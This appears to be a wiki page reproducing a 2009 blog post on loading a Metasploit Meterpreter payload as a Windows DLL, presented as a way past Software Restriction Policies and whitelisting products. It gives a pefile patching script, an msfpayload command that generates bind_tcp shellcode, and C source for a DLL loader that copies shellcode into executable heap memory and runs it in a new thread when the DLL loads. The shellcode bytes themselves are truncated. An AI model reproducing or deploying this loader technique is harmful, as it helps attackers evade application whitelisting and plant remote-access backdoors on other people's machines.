<!-- TITLE: Payloaddll -->
<!-- SUBTITLE: A quick summary of Payloaddll -->

From
http://hype-free.blogspot.com/2009/01/loading-meterpreter-in-dll.html

Some times it may be useful to load the Meterpreter (or any payload in fact) as a DLL. Two scenarios I can think of:

Software Restriction Policies (and many other whitelisting products) don't filter DLLs (even though, they probably can be configured - SRP can be for example), so it might be useful to get in and execute the code from a DLL.
It may be interesting to load it in a MSI.

Anyway, first I tried the easy way: generate an executable and patch it as a DLL with a short pefile script:

import pefile
pe = pefile.PE("runme.exe")
pe.FILE_HEADER.Characteristics += 0x2000
pe.write(filename="loadme.dll")

This works... With a couple quite problematic shortcomings:

The PE file generated by msfpayload is based at 0x400000 and contains no relocation information, making it quite unlikely that it can be loaded in any real application...
And second: the launching of the shellcode is done from what is the "DllMain", resulting in the fact that the thread which loads the DLL will go in never ever land and won't be heard of again (with less nonsense: it will execute the shellcode and won't return from it, which can lead to things like freezing GUI / application if it is loaded from the main thread).

The conclusion is that a custom DLL written in C is needed. Fortunately it is quite easy to write such a thing. For this example I use the LCC-Win32 compiler because it is a nice and slim one, but you can use anything (like GCC, Watcom C - which is also free BTW - or even Visual C++).

First, export the shellcode:

./msfpayload windows/meterpreter/bind_tcp C > foo.txt

You should see something like the following in the output file:

unsigned char buf[] =

"\xfc\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b"

...

Now it is time to create the project. The full source code is below (I omitted the actual payload code to shorted the post a little:


```text
#include <windows.h>

#include <string.h>



#ifdef __cplusplus

extern "C" DWORD WINAPI __declspec(dllexport) doNothingFunc(HANDLE hInstaller);

#endif



unsigned char buf[] =

"\xfc\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b"

...;


DWORD WINAPI __declspec(dllexport) doNothingFunc(HANDLE hInstaller) {

 // we have done nothing successfully :-)

 MessageBox(NULL, "Here!", "Here!", MB_OK + MB_SERVICE_NOTIFICATION);

 return ERROR_SUCCESS;

}



DWORD WINAPI startShellcode(LPVOID lpParameter) {

 DWORD oldProtect;

 DWORD (*shellcode)(void);



 HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(buf), 2*sizeof(buf));

 if (NULL == hHeap) return GetLastError();

 void *shellCodeCopy = HeapAlloc(hHeap, 0, sizeof(buf));

 if (NULL == shellCodeCopy) return GetLastError();



 memcpy(shellCodeCopy, buf, sizeof(buf));

 VirtualProtect(shellCodeCopy, sizeof(buf), PAGE_EXECUTE_READWRITE, &oldProtect);

 shellcode = shellCodeCopy;

 return shellcode();

}



BOOL WINAPI __declspec(dllexport) LibMain(HINSTANCE hDLLInst, DWORD fdwReason, LPVOID lpvReserved) {

 if (DLL_PROCESS_ATTACH == fdwReason) {

  CreateThread(NULL, 0, startShellcode, NULL, 0, NULL);

  Sleep(500);

 }

    return TRUE;

}


```
